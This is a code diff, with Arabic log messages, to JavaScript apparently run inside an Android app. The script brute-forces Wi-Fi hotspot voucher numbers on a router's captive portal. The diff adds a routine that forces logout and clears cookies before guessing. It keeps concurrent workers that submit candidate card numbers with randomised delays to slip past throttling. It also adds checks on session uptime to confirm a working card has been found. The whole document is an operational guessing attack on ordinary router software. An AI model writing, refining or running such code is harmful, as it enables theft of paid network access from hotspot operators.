@@ -52,6 +52,47 @@
         const u = String(st.username || '').trim();
         return (u && u !== '-' && u !== 'N/A' && u !== '---') ? u : null;
     }
+    function uptimeSec(s) {
+        if (!s) return -1;
+        const m = String(s).trim().match(/^(?:(\d+)d)?(?:(\d+)h)?(?:(\d+)m)?(?:(\d+)s)?$/);
+        if (!m) return -1;
+        return (parseInt(m[1]||0)*86400) + (parseInt(m[2]||0)*3600) + (parseInt(m[3]||0)*60) + parseInt(m[4]||0);
+    }
+
+    // ⚡ دالة ذهبية: تسجيل الخروج الإجباري وإفراغ الجلسة
+    async function resetSession(base, statusUrl) {
+        log('🔄 فحص الجلسة الحالية...');
+        const st = await safeJson(statusUrl);
+        
+        if (!st || !isActive(st)) {
+            log('✓ لا توجد جلسة نشطة، جاهز للتخمين.');
+            return true;
+        }
+        
+        log('⚠ توجد جلسة نشطة (الكرت: ' + (statusUser(st) || 'غير معروف') + ')');
+        log('→ جاري تسجيل الخروج لإفراغ الجلسة...');
+        
+        try { await fetch(base + '/logout?erase-cookie=yes&var=callBack', { credentials: 'include' }); } catch(e) {}
+        await sleep(1000);
+        try { await fetch(base + '/logout', { credentials: 'include' }); } catch(e) {}
+        
+        if (window.AndroidBridge && window.AndroidBridge.clearCookies) {
+            window.AndroidBridge.clearCookies();
+        }
+        
+        log('→ انتظار 3 ثوانٍ حتى ينسى الراوتر الجلسة...');
+        await sleep(3000);
+        
+        const st2 = await safeJson(statusUrl);
+        if (st2 && isActive(st2)) {
+            log('❌ الراوتر يرفض الخروج!');
+            log('   اخرج يدوياً من صفحة الراوتر ثم أعد المحاولة.');
+            return false;
+        }
+        
+        log('✓ تم إفراغ الجلسة بنجاح! جاهز للتخمين.');
+        return true;
+    }
 
     async function run() {
         try {
@@ -59,16 +100,14 @@
             const statusUrl = base + '/status?var=callBack';
             const loginUrl = base + '/login';
 
-            log('▶ بدء التخمين (خيوط مستقلة)');
+            log('▶ بدء التخمين (نمط الخيوط المستقلة)');
+            
+            // تسجيل الخروج أولاً
+            const resetOk = await resetSession(base, statusUrl);
+            if (!resetOk) return;
+
             const tried = new Set(CFG.tried || []);
             log('  تم تجربة ' + tried.size + ' رقم سابقاً');
-            
-            const init = await safeJson(statusUrl);
-            if (init && isActive(init)) {
-                const u = statusUser(init);
-                if (u) { log('✓ كرت مسجل موجود: ' + u); window.AndroidBridge.found(u, JSON.stringify(init)); return; }
-                log('⚠ جلسة نشطة'); return;
-            }
 
             let template = { username: '', password: '', dst: base + '/', popup: 'true' };
             try {
@@ -151,7 +190,6 @@
                 }
             }
 
-            // سيقوم كل خيط بالعمل بشكل مستقل تماماً
             async function worker() {
                 while (done < CFG.attempts && !stopped) {
                     if (routerBusy) { await sleep(RETRY_DELAY); continue; }
@@ -173,7 +211,6 @@
                     log('🔍 ' + v);
                     try { window.AndroidBridge.progress(done, CFG.attempts, v); } catch(e){}
 
-                    // كل خيط يأخذ وقتاً مختلفاً قبل إرسال الطلب
                     const delay = Math.floor(Math.random() * (DELAY_MAX - DELAY_MIN + 1)) + DELAY_MIN;
                     await sleep(delay);
                     
@@ -191,9 +228,16 @@
                         await sleep(100);
                         const st = await safeJson(statusUrl);
                         const u = statusUser(st);
-                        if (u) {
+                        if (u && u === v) {
                             log('✅✅✅ وجد الكرت: ' + u);
                             window.AndroidBridge.found(u, JSON.stringify(st));
+                            stopped = true;
+                            return;
+                        }
+                        const up = uptimeSec(st && st.uptime);
+                        if (st && isActive(st) && up >= 0 && up <= 20) {
+                            log('✅✅✅ جلسة جديدة: ' + v);
+                            window.AndroidBridge.found(v, JSON.stringify(st));
                             stopped = true;
                             return;
                         }
@@ -201,7 +245,6 @@
                 }
             }
 
-            // تشغيل الخيوط
             const workers = [];
             for (let i = 0; i < MAX_CONCURRENT; i++) {
                 workers.push(worker());
